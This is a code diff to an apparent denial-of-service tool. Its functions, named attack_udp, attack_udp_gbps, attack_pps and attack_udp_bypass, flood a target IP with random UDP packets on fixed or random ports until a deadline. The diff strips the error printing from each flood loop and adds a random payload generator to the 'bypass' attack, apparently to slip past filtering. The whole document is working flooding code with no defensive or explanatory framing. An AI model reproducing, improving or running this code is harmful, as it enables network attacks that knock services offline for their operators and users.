@@ -23,7 +23,6 @@ def attack_udp(ip, port, end_time, size):
                 data = os.urandom(size)
                 s.sendto(data, (ip, dport))
         except Exception as e:
-            print("Error:", e)
             continue
         finally:
             s.close()
@@ -57,7 +56,6 @@ def attack_udp_gbps(ip, port, end_time, size):
                 s.sendto(data, (ip, dport))
                 s.sendto(data, (ip, dport))
         except Exception as e:
-            print("Error:", e)
             continue
         finally:
             s.close()
@@ -87,7 +85,6 @@ def attack_pps(ip, port, end_time, size):
             while time.time() < end_time:
                 s.sendto(data, (ip, dport))
         except Exception as e:
-            print("Error:", e)
             continue
         finally:
             s.close()
@@ -96,6 +93,9 @@ def attack_pps(ip, port, end_time, size):
 
 #bypass attacks
 
+
+def generate_random_payload(size):
+    return bytes(random.getrandbits(8) for _ in range(size))
 
 def attack_udp_bypass(ip, port, end_time, size):
     max_packets = 1950
@@ -106,11 +106,10 @@ def attack_udp_bypass(ip, port, end_time, size):
             dport = random.randint(1, 65535) if port == 0 else port
             packets_sent = 0
             while time.time() < end_time and packets_sent < max_packets:
-                data = os.urandom(size)
+                data = generate_random_payload(size)
                 s.sendto(data, (ip, dport))
                 packets_sent += 1
         except Exception as e:
-            print("Error:", e)
             continue
         finally:
             s.close()
